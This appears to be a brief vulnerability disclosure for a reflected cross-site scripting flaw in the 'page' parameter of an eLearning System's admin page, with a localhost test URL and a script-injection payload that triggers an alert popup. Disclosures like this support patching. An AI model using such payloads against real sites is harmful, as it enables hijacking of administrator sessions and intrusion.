# eLearning System – reflected XSS on (admin/?page=XX) 
# Vendor Homepage:
https://www.sourcecodester.com/php/14787/elearning-system-using-phpmysqli-source-code.html 
# Version:V1.0
Tested on: PHP, Apache, MySQL
# Affected Page:
admin/?page=XX 
On this page,page parameter is vulnerable to reflected XSS Attack 
# Proof of vulnerability:
Visit this page：http://localhost/elearning/admin/?page=student
# Payload：
？page=</script><script>alert(1)</script>
# Trigger popup：
<img width="416" alt="image" src="https://github.com/qqqyc/vuln/assets/53200267/ec3297fd-f50a-4ddd-ab5b-73d5aea23897">
